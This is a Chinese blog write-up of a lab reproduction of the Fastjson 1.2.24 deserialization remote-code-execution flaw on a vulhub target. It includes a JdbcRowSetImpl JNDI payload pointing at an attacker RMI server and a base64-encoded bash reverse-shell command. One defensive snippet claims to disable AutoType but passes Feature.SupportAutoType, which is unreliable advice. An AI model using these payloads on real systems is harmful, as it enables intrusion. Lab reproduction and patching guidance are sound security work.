---
title: Fastjson反序列化漏洞（1.2.24版本）
slug: fastjsonfan-xu-lie-hua-lou-dong-1.2.24ban-ben
cover: ""
categories:
  - 漏洞复现
tags:
  - fastjson
  - CVE
halo:
  site: http://www.hzhsec.top
  name: 625ef015-965b-464a-875f-df1e0854d7d9
  publish: true
---

---
# 漏洞简介

- 漏洞成因:
首先介绍一下fastjson是什么?

Fastjson 是一个用于 Java 对象与 JSON 数据相互转换的库。

为什么会有这个漏洞呢?

原因是在低版本的fastjson中,默认开启了autotype选项,使得在反序列化json的时候,可以指定特定的类进行反序列化,
由于反序列化时,会触发类的构造函数,setter,getter或者其他隐式方法
攻击者可以通过精心构造恶意json,反序列化,触发特定的类,传入构造的参数,如果这些类的方法刚刚好使用了攻击者可控的参数,就会形成利用链,最终触发JNDI注入,实现远程代码执行

以下是一个autotype的基本用法:
```
{
	"@type": "SomeClass",
	 "url": "xxx"
}
```
其中type参数是传入的要反序列加载的类
url相当于type类里面执行了setUrl("xxx"),会改变类里面的值

注意:不同的环境会因为Classpath不同,形成不同的Gadget/利用链


影响版本:
受fastjson影响的带漏洞版本有很多:

1.2.24及以下没有对序列化的类做校验,导致漏洞产生
1.2.25-1.2.41增加了黑名单限制，更改autoType默认为关闭选项。
1.2.42版本是对1.2.41及以下版本的黑名单绕过,代码内更新字符串黑名单hash方式
1.2.43版本是对1.2.42及以下版本的黑名单绕过
1.2.44-1.2.45版本1.2.43版本黑名单无法绕过,寻找新的利用链进行利用
1.2.47版本 利用fastjson处理Class类时的操作,将恶意类加载到缓存中,实现攻击
1.2.62-1.2.67版本Class不会再往缓存中加载恶意类,寻找新的利用链进行突破
1.2.68版本,使用期望类AutoCloseable来绕过fastjson校验
1.2.72-1.2.80使用期望类Throwable的子类,进行绕过

接下来,我复现的是1.2.24版本的fastjson

# 漏洞复现

## 环境搭建
1. **靶机环境**（使用 vulhub）：
```bash
   cd vulhub/fastjson/1.2.24-rce
   docker-compose up -d
```
访问：http://靶机IP:8090
![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020251229201244.png)
2. **攻击机环境**：
    - Java-Chains（用于生成 JNDI 利用链）
    - nc/netcat（用于监听反弹 shell）
3. **估计步骤**


- 使用javachains生成jndi的dnslog命令,检测是否出网
post发送
```
{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.41.128:50388/fb4ac1",
        "autoCommit":true
    }
}
```
![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020251229202025.png)
![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020251229201902.png)

- 尝试命令执行反弹shell
```shell
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMi4xNjcuMTY0LzQ0NDQgMD4mMQ==" | base64 -d | bash
```

成功反弹
![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020251229202325.png)

原理:
通过fastjson反序列化,加载类com.sun.rowset.JdbcRowSetImpl,这个类是jdbc的数据库驱动类先将autoCommit赋值为true,说明开启自动连接,就是在类进行初始化的时候自动连接

为什么jdbc会调用ldap和rmi协议呢?

dataSourceName则是通过jdbc连接数据库,由于jdbc的连接操作是通过jndi接口来进行,就是会根据url前缀来选择相应的服务器提供者

| URL 格式                 | 协议   | JNDI 服务提供者              | 用途          |
| ---------------------- | ---- | ----------------------- | ----------- |
| `rmi://host:port/name` | RMI  | `rmiURLContextFactory`  | Java 远程对象调用 |
| `ldap://host:port/dn`  | LDAP | `ldapURLContextFactory` | 目录服务访问      |
| `dns://host/name`      | DNS  | `dnsURLContextFactory`  | 域名解析        |
| `file:///path`         | File | `fsURLContextFactory`   | 文件系统访问      |
简化后的连接代码:
```java
// 简化后的关键代码
public void connect() throws SQLException {
    if (conn != null) return;
    
    // 使用 JNDI 查找数据源
    InitialContext ctx = new InitialContext();
    DataSource ds = (DataSource) ctx.lookup(dataSourceName);
    conn = ds.getConnection();
}
根据url前缀来选择相应的服务器提供者
```

# 漏洞防御

### **最根本的解决方案**

将 Fastjson 升级到最新安全版本
- **1.2.83 及以上版本**：官方修复了大部分已知漏洞
- **1.2.68 及以上版本**：修复了 AutoCloseable 绕过问题
- **建议**：直接升级到最新稳定版

### 关闭autotype开关
在配置文件中显式关闭 AutoType（如果业务不需要）：
```java
// 全局关闭 AutoType
ParserConfig.getGlobalInstance().setAutoTypeSupport(false);

// 或者创建 JSON 对象时指定
JSON.parseObject(jsonString, Object.class, Feature.SupportAutoType);
```
### 配置黑白名单

白名单方式（推荐）
```java
ParserConfig config = ParserConfig.getGlobalInstance();
// 添加允许反序列化的类
config.addAccept("com.example.safe.");
config.addAccept("java.util.");
// 关闭其他所有
config.setAutoTypeSupport(false);
```

### 运行时安全措施

#### JVM 参数限制
```java
# 禁用远程类加载
-Dcom.sun.jndi.rmi.object.trustURLCodebase=false
-Dcom.sun.jndi.cosnaming.object.trustURLCodebase=false

# JDK 6u132, 7u122, 8u113 及以上版本默认已设置
```

